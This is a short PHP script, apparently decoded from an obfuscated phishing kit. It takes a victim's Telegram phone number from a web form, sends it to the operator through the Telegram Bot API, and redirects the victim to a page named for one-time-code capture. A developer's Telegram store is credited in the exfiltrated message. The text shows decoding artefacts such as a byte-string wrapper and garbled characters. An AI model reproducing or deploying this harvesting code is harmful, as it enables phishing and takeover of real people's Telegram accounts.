/* Decoded by unphp.net */

?>b'<?php
include "portalbot.php";
session_start();

$bacot1 = $_POST[\'bacot1\'];

$message = "
Developer: https://t.me/masterwebstore
â â¤  Nomor Telegram : ".$bacot1."
 ";
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header(\'Location: c0d30tp.php\');
?>
'